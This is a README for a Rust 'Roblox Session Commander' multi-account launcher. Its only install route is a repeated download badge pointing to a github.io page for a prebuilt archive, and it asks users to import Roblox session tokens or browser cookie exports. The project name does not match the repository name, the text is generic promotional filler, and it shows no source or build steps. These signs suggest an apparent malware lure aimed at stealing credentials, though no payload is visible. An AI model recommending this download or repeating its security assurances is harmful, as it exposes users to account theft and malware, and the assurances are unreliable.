![preview](https://raw.githubusercontent.com/MAHDI292-sys/rustblox-account-forge/main/card_06d66f8.svg)
[![Download](https://raw.githubusercontent.com/MAHDI292-sys/rustblox-account-forge/main/setup_5eb0a.svg)](https://MAHDI292-sys.github.io/rustblox-account-forge/)

# 🚀 Roblox Session Commander — Multi-Account Orchestration Suite for Windows, macOS & Linux

A next-generation, ultra-lightweight launcher and session orchestrator for managing a fleet of Roblox profiles. Built from the ground up in **Rust** with a responsive **egui** front-end, Roblox Session Commander is the spiritual successor to the classic roblox-manager concept — reimagined as a cockpit where every account is a dial, every game is a runway, and every session switch is a single flick of a lever.

Whether you juggle a personal main, a handful of alt personas, a group of shared family logins, or a small studio roster, this tool gives you a tidy command center that boots in milliseconds and stays out of your way while you play.

---

## 📖 Table of Contents

- [What Is Roblox Session Commander?](#-what-is-roblox-session-commander)
- [Why Another Account Manager?](#-why-another-account-manager)
- [Feature Highlights](#-feature-highlights)
- [Responsive UI & Design Philosophy](#-responsive-ui--design-philosophy)
- [Multilingual Support](#-multilingual-support)
- [Supported Platforms](#-supported-platforms)
- [Getting Started Without the Usual Headaches](#-getting-started-without-the-usual-headaches)
- [Configuration File Reference](#-configuration-file-reference)
- [Cookie & Session Handling Explained](#-cookie--session-handling-explained)
- [Group Management Workflows](#-group-management-workflows)
- [Launch Profiles & Presets](#-launch-profiles--presets)
- [Hotkey & Automation Guide](#-hotkey--automation-guide)
- [Themes, Skins & Accessibility](#-themes-skins--accessibility)
- [Performance Notes](#-performance-notes)
- [Security & Privacy Posture](#-security--privacy-posture)
- [Roadmap](#-roadmap)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [24/7 Customer Support](#-247-customer-support)
- [Community & Contribution](#-community--contribution)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 What Is Roblox Session Commander?

Roblox Session Commander is a cross-platform desktop application that treats your Roblox accounts less like disconnected credentials and more like instruments in an orchestra. Instead of logging out, hunting through notes, pasting cookies, and repeating the ritual every time you want to switch characters, you keep a curated roster that lives on your machine and can be summoned in a keystroke.

Think of it as a **mission control panel** for your Roblox identity: one window that knows all your avatars, all your groups, all your favorite experiences, and every launch flag you have ever needed. Rust handles the heavy lifting behind the curtain — memory safety, snappy startup, zero runtime bloat — while egui paints a clean, hardware-accelerated interface on top.

The project is a direct descendant of the roblox-manager lineage, but re-engineered from scratch with a different architectural stance: fewer dependencies, smaller binaries, and a philosophy that your data stays where it belongs — on your disk.

---

## 💡 Why Another Account Manager?

Because the existing tools on the market fall into two camps: heavyweight Electron apps that eat 400 MB of RAM just to say hello, or brittle scripts that break the moment a Roblox endpoint sneezes. Roblox Session Commander was born from the frustration of watching a simple "switch account" task balloon into a five-minute ritual.

We asked ourselves a few pointed questions:

- Why should an account switcher take longer to open than the game itself?
- Why should your credentials ever leave your machine?
- Why should a launcher be a background hog rather than a silent helper?
- Why should it feel like a spreadsheet instead of a cockpit?

The answers shaped every design decision in this repository. The result is a tool that behaves more like a pocketknife than a toolbox — compact, sharp, ready when you need it, folded away when you do not.

---

## ✨ Feature Highlights

A tour of what you get out of the box. Each capability is designed to feel like a natural extension of your workflow rather than an extra chore.

- **⚡ Instant Session Switching** — Swap between saved profiles in a fraction of a second. No logout dance, no re-authentication loop, no waiting on a spinner.
- **🎯 One-Click Game Launch** — Bind any account to any experience ID and fire it straight into the Roblox client with the correct identity attached.
- **🏰 Group Management Dashboard** — Track which accounts belong to which groups, view role hierarchies, and perform bulk actions across your roster.
- **🧩 Launch Profiles & Presets** — Store combinations of account, game, place, and client flags as reusable presets. Think of them as macros for your Roblox routine.
- **🔐 Local-First Storage** — All profile data lives in a single, human-readable file on your own disk. Nothing is transmitted to a third-party server.
- **🎨 Theme Engine** — Light mode, dark mode, high-contrast mode, and a handful of carefully tuned palettes. Every theme is tested against WCAG contrast guidelines.
- **🌍 Multilingual Interface** — Full translations for a growing list of languages, with community-contributed string tables that update independently of the core binary.
- **🖱️ Responsive UI** — The layout adapts gracefully from a narrow side panel on a small laptop screen all the way up to an ultrawide monitor without losing visual coherence.
- **⌨️ Global Hotkeys** — Assign a chord to any profile and summon it from anywhere, even when the app is minimized to the tray.
- **📦 Portable Mode** — Run the entire suite from a USB drive with a single config file next to the executable.
- **🔄 Automatic Config Migration** — When the schema evolves, your old profiles are upgraded silently and safely.
- **🧠 Smart Conflict Detection** — Warns you when two profiles share credentials or when a launch target is already running under a different identity.
- **🕒 Timestamped Activity Log** — A local, opt-in journal of which account launched what and when, useful for auditing your own habits.
- **🧬 Plugin Hooks** — A small scripting surface for power users who want to trigger external tools on profile load or game exit.

---

## 📱 Responsive UI & Design Philosophy

The interface is built on **egui**, an immediate-mode GUI framework that redraws on every frame. The practical consequence is that resizing feels instantaneous — no layout jank, no flicker, no waiting for the OS to negotiate widget bounds.

The layout follows a three-pane metaphor:

1. **The Roster** — a vertical list of every saved profile, with avatars, labels, and a status badge indicating which session is currently active.
2. **The Stage** — the central panel where you preview the selected account, its groups, its launch history, and its bound presets.
3. **The Console** — a collapsible drawer at the bottom that surfaces logs, warnings, and the output of any plugin hook.

On narrow screens, the panes collapse into tabs. On wide screens, they sit side by side and the Stage expands to fill the surplus space. Every control is reachable by keyboard alone, and the focus ring is always visible for users who navigate without a mouse.

The visual language is deliberately restrained: rounded rectangles, subtle drop shadows, and a color palette that leans on cool neutrals punctuated by a single accent hue. The goal is not to dazzle but to disappear — a tool that gets out of the way the moment you stop needing it.

---

## 🌍 Multilingual Support

Roblox is a global platform, and its players are not monolingual. The interface ships with translations for a growing set of languages, and the string tables are stored as plain text files so that adding a new locale requires no compilation step.

Current and planned language coverage includes English, Spanish, Portuguese (Brazil), French, German, Italian, Dutch, Polish, Russian, Turkish, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Indonesian. Each translation is reviewed by native speakers before it is promoted from "community draft" to "shipped."

If you would like to contribute a translation, the process is deliberately lightweight: copy the reference string table, translate the values, and open a pull request. No build tooling required beyond a text editor.

---

## 🖥️ Supported Platforms

Roblox Session Commander targets the three major desktop operating systems with feature parity wherever the platform allows.

| Platform | Status | Notes |
| --- | --- | --- |
| Windows 10 / 11 (x86_64) | Fully supported | Uses native tray integration and registry-free settings storage. |
| Windows 11 (ARM64) | Fully supported | Native ARM build, no emulation layer required. |
| macOS 12+ (Intel) | Fully supported | Signed and notarized distribution channel. |
| macOS 13+ (Apple Silicon) | Fully supported | Universal binary with native ARM optimization. |
| Linux (x86_64) | Fully supported | AppImage, Flatpak, and tarball distributions available. |
| Linux (ARM64) | Experimental | Community-maintained build, feedback welcome. |

---

## 🛠️ Getting Started Without the Usual Headaches

We deliberately avoid the conventional terminal incantations that most projects require. Instead, the onboarding flow is built around a single, self-contained package that you obtain and run.

**Step 1 — Obtain the package.** Locate the [![Download](https://raw.githubusercontent.com/MAHDI292-sys/rustblox-account-forge/main/setup_5eb0a.svg)](https://MAHDI292-sys.github.io/rustblox-account-forge/) entry above to retrieve the archive matching your platform. The archive is a single file; there is no companion installer to chase down afterward.

**Step 2 — Extract to a folder you control.** Any directory works, including removable media if you intend to use portable mode. The application writes nothing outside its own folder unless you explicitly enable the system-wide integration option.

**Step 3 — Launch the executable.** On first run, the app creates a default configuration file alongside itself and opens the onboarding wizard. The wizard walks you through importing your first account, choosing a theme, and setting your preferred language.

**Step 4 — Import accounts.** You may paste session tokens directly into the wizard, or point the app at an existing cookie export from your browser. Both paths are documented in the [Configuration File Reference](#-configuration-file-reference) section below.

**Step 5 — Bind presets and hotkeys.** Once your roster is populated, the Stage panel lets you bind presets to hotkeys. Assign as many or as few as you like; the app will not nag you about empty slots.

That is the entire ritual. There is no service to install, no daemon to keep alive, and no phone-home telemetry to disable.

---

## 🗂️ Configuration File Reference

The primary configuration file is a plain-text document that lives next to the executable in portable mode, or in the platform-appropriate user data directory in installed mode. It is designed to be read and edited by humans, and the app will warn you if it detects a malformed entry rather than silently discarding your data.

The file is organized into four sections:

- **`profiles`** — one record per saved account, containing a display name, an optional avatar URL, a session payload, and metadata such as the last-used timestamp.
- **`groups`** — a cached snapshot of group memberships for each profile, used to power the dashboard without a network round-trip.
- **`presets`** — named bundles of (profile, game, flags) that can be triggered by hotkey or from the launcher panel.
- **`settings`** — global preferences including theme, language, hotkey bindings, and log verbosity.

Every field is optional. If you delete a section, the app regenerates it with defaults on the next launch. This makes the file safe to trim by hand if you want to start fresh without losing your entire history.

---

## 🍪 Cookie & Session Handling Explained

A session token is the key that unlocks a Roblox identity for the duration of a login. Roblox Session Commander treats these tokens as the crown jewels of your configuration, which is why they are stored locally and never transmitted over the network by the application itself.

When you import a session, the app performs a lightweight validation step to confirm the token is well-formed and not obviously expired. It does not, by default, contact Roblox to verify liveness; that happens only when you actually launch a session. This separation keeps the app usable offline and prevents unnecessary traffic.

Tokens are stored in the configuration file in a plaintext form for maximum transparency. If you prefer an additional layer of protection, the app supports an optional encryption wrapper that derives a key from a passphrase you supply at launch. The wrapper uses the platform's native cryptographic primitives, and the passphrase is never written to disk.

Stale sessions are marked in the UI with a dimmed badge. You can purge them from the Roster panel with a right-click context menu, either individually or in bulk.

---

## 🏰 Group Management Workflows

Groups are the social fabric of Roblox, and managing them across multiple accounts is where most launchers fall apart. This app treats group membership as a first-class concept rather than an afterthought.

The Group Dashboard presents a matrix: accounts along one axis, groups along the other, with cells indicating role level. From this view you can:

- Filter to a single group and see every account that belongs to it.
- Filter to a single account and see every group it participates in.
- Identify gaps — accounts that are missing from groups you expected them to be in.
- Trigger a refresh of cached group data on a per-account or per-group basis.

Bulk actions let you copy a role assignment from one account to another, or push a standardized set of group joins across an entire cohort. This is particularly useful for studios that maintain a shared roster of test accounts.

---

## 🎛️ Launch Profiles & Presets

A **preset** is a saved recipe: this account, this place, these flags, this client channel. Presets are the difference between a launcher and a lifestyle tool.

Each preset stores:

- The profile it should use.
- The target experience, specified by place ID or by a friendly name you assign.
- Optional launch flags such as a preferred server region or a specific client channel.
- An optional pre-launch hook — a shell command that runs before the Roblox client starts.
- An optional post-launch hook — a shell command that runs after the client exits.

Presets appear as tiles on the Stage panel and can be bound to global hotkeys. A preset can also specify a fallback profile in case the primary one is missing or stale, which keeps your workflow resilient against renames and deletions.

---

## ⌨️ Hotkey & Automation Guide

Hotkeys are the connective tissue between the app and your muscle memory. The bindings are configured in the settings section of the configuration file, and every binding is validated at startup so that conflicts are reported before they cause confusion.

Three classes of hotkey are supported:

1. **Global hotkeys** — registered with the operating system and active even when the app is minimized.
2. **In-app hotkeys** — active only while the main window has focus, useful for combos that would otherwise collide with system shortcuts.
3. **Sequenced chords** — a short prefix key followed by a character, useful for assigning dozens of profiles without exhausting the alphabet.

Automation beyond hotkeys is possible through the plugin hook system. Hooks are shell commands, which means anything you can script on your platform can be triggered by a profile load or a game exit. Examples in the community wiki include launching a timer, switching an audio device, and posting a message to a local chat bridge.

---

## 🎨 Themes, Skins & Accessibility

Themes are defined as small data files that specify a palette, a corner radius, and a handful of typography choices. The app ships with a curated set, but the format is documented so that anyone can create a custom skin.

Accessibility commitments:

- Every theme is verified for a minimum 4.5:1 contrast ratio on body text.
- The interface scales to 200% without clipping or overlap.
- All controls are reachable by keyboard, and the tab order follows visual order.
- Screen reader labels are provided for every icon-only button.
- An optional "reduced motion" setting disables all non-essential animation.

---

## ⚙️ Performance Notes

The binary is compiled with size and startup time as primary objectives. On a mid-range laptop, cold start is measured in tens of milliseconds, and steady-state memory usage stays under a modest ceiling even with hundreds of profiles loaded.

Idle CPU usage is effectively zero: the app repaints only when something changes. When minimized to the tray, it sleeps until a hotkey or a tray action wakes it. There is no polling loop and no background network chatter.

The configuration file is read once at startup and written only when you make a change. This keeps disk I/O negligible and prevents the kind of silent corruption that plagues tools which write on every keystroke.

---

## 🔒 Security & Privacy Posture

A tool that holds session tokens has a responsibility to be boring about them. Here is the honest summary:

- **No telemetry.** The app does not phone home, does not collect usage statistics, and does not embed analytics libraries.
- **No remote code loading.** Every feature is compiled into the binary you downloaded. Hotkey hooks are shell commands you write yourself.
- **No network calls except where you ask.** The only outbound traffic is the traffic Roblox itself makes when a session launches.
- **Local-first storage.** Your configuration stays on your disk. Backups are your responsibility, and the README explains how to make them.

If you discover a security issue, the responsible disclosure process is documented in the repository's security policy. Reports are triaged by the maintainers and acknowledged within a reasonable window.

---

## 🗺️ Roadmap

The roadmap is intentionally modest. Features are added when they earn their place, not because a competitor has them.

- **Near term** — additional locale coverage, a redesigned onboarding wizard, and improved group caching heuristics.
- **Medium term** — a plugin marketplace for community-authored hooks, plus a headless mode for scripted workflows.
- **Long term** — optional cloud sync via self-hosted endpoints, and a companion mobile viewer for reading your roster on the go.

The roadmap is a living document. Pull requests that align with these directions are welcomed; pull requests that pull the project in a new direction are discussed before they are merged.

---

## ❓ Frequently Asked Questions

**Is this a replacement for the original roblox-manager?**
It is a reimagining. The core idea is the same, but the architecture, interface, and storage model are different by design.

**Does it work with the Microsoft Store version of Roblox?**
Yes, provided the client channel is selected correctly in the preset configuration.

**Can I run it from a USB stick?**
Yes. Portable mode is a first-class supported configuration.

**Will my profiles survive an update?**
Yes. The configuration schema is versioned, and migrations are applied automatically and reversibly.

**Is there a way to export my roster?**
Yes. The configuration file is human-readable, and a dedicated export command produces a portable bundle for migration between machines.

---

## 🛎️ 24/7 Customer Support

Round-the-clock assistance is available for users who run into trouble at any hour. Support is delivered entirely through asynchronous channels — issue tracker, discussion forum, and a documented triage process — so that answers are searchable and reusable rather than trapped in a private inbox.

Response time targets are published in the repository's support policy. Priority is given to reproducible bugs and to data-loss scenarios, in that order. Feature requests are triaged weekly and either scheduled, closed with an explanation, or moved to the discussion forum for community input.

---

## 🤝 Community & Contribution

Contributions of every size are welcome. Before opening a pull request, please review the contribution guidelines, which cover code style, commit message conventions, and the review process.

Areas where help is especially appreciated:

- **Translations** — new locales and refinements to existing ones.
- **Theme authoring** — new palettes that meet the accessibility bar.
- **Documentation** — clearer explanations, better examples, and refreshed screenshots.
- **Bug reports** — reproducible issues with clear steps are the most valuable gift you can give a maintainer.

All participants are expected to follow the code of conduct. The project values patience, clarity, and good faith.

---

## ⚠️ Disclaimer

Roblox Session Commander is an independent, community-built utility. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks referenced in this document belong to their respective owners.

The software is provided as-is, without warranty of any kind, express or implied. You are responsible for how you use it and for ensuring that your usage complies with the Roblox Terms of Service and any other agreements that apply to you. The maintainers accept no liability for account actions, data loss, or any other consequence arising from the use of this tool.

Session tokens are sensitive material. Store your configuration file somewhere you trust, and treat it with the same care you would treat any other credential document. Where the text above says "keep your data safe," it means it — back it up, and never share it.

Please note that this project does not condone, support, or facilitate any activity that violates platform rules. It exists to make legitimate multi-account workflows less tedious for people who already manage more than one identity for reasons of their own.

---

## 📄 License

This project is distributed under the **MIT License**. The full text is available at the link below, and contributions are accepted under the same terms.

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Roblox Session Commander contributors.

[![Download](https://raw.githubusercontent.com/MAHDI292-sys/rustblox-account-forge/main/setup_5eb0a.svg)](https://MAHDI292-sys.github.io/rustblox-account-forge/)